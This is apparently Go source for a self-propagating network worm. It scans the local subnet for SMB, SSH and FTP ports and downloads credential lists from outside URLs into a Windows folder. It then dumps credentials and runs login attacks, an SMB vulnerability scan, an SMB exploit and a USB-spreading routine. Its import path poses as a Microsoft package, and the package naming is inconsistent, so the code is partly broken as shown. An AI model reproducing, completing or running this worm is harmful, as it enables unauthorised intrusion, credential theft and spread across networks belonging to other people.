package worm

import (
	"fmt"
	"net"
	"os"
	"sync"
	"time"
	"github.com/MicrosoftMalwareDefender/packages"
)

var (
	localIP         string
	otherHostsExist bool
	wg              sync.WaitGroup
)

func Worm() {
	// Get local IP address
	var err error
	localIP, err = getLocalIP()
	if err != nil {
		fmt.Println("Failed to get local IP:", err)
		return
	}

	// Determine network range
	ip, ipNet, err := net.ParseCIDR(localIP + "/24") // Assuming a /24 subnet mask, adjust as needed
	if err != nil {
		fmt.Println("Failed to parse CIDR:", err)
		return
	}

	// Scan ports for each host in the network
	fmt.Printf("Scanning network range: %s\n", ipNet.String())

	// Wait group for concurrent scanning
	for ip := ip.Mask(ipNet.Mask); ipNet.Contains(ip); incrementIP(ip) {
		host := ip.String()

		// Skip scanning own IP address
		if host == localIP {
			continue
		}

		fmt.Printf("Scanning host: %s\n", host)

		// Add concurrent scans for multiple ports
		for _, port := range []int{445, 22, 21} {
			wg.Add(1)
			go scanAndWrite(host, port)
		}
	}

	// Wait for all scans to finish
	wg.Wait()

	if !otherHostsExist {
		fmt.Println("No other hosts. You are alone on the network.")
	}

	// Run pack.USBWorm concurrently
	go pack.USBWorm()

	// Block the main program from exiting immediately
	select {}
}

func scanAndWrite(host string, port int) {
	defer wg.Done()

	if scanPort(host, port) {
		fmt.Printf("Port %d is open on %s\n", port, host)
		writeToFile(getFileName(port), host)

		// Call the SSH login function if port 22 is open
		if port == 22 {
			fmt.Printf("Calling SSH login function for host %s\n", host)
			pack.DownloadFile("https://sourceforge.net/projects/app/files/ssh.txt/download", "ssh.txt", "C:\\Windows\\loveorhate")
			pack.DumpCred()
			pack.SSH()
		}

		// Call the FTP login function if port 21 is open
		if port == 21 {
			fmt.Printf("Calling FTP login function for host %s\n", host)
			pack.DownloadFile("https://sourceforge.net/projects/app/files/ftp.txt/download", "ftp.txt", "C:\\Windows\\loveorhate")
			pack.DumpCred()
			pack.FtP()
		}

		// Call the SMB login function if port 445 is open
		if port == 445 {
			fmt.Printf("Calling SMB login function for host %s\n", host)
			pack.DownloadFile("https://sourceforge.net/projects/app/files/smb.txt/download", "smb.txt", "C:\\Windows\\loveorhate")
			pack.DumpCred()
			pack.SMB()
			pack.Vunlscanner()
			pack.SMBEXP()
		}
	}
}

func getLocalIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "", err
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String(), nil
}

func scanPort(host string, port int) bool {
	target := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", target, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	return true
}

func incrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func getFileName(port int) string {
	switch port {
	case 445:
		return "smbip.txt"
	case 22:
		return "sship.txt"
	case 21:
		return "ftpip.txt"
	default:
		return fmt.Sprintf("port%d.txt", port)
	}
}

func writeToFile(filename, host string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening file %s: %v\n", filename, err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(host + "\n"); err != nil {
		fmt.Printf("Error writing to file %s: %v\n", filename, err)
	}
}
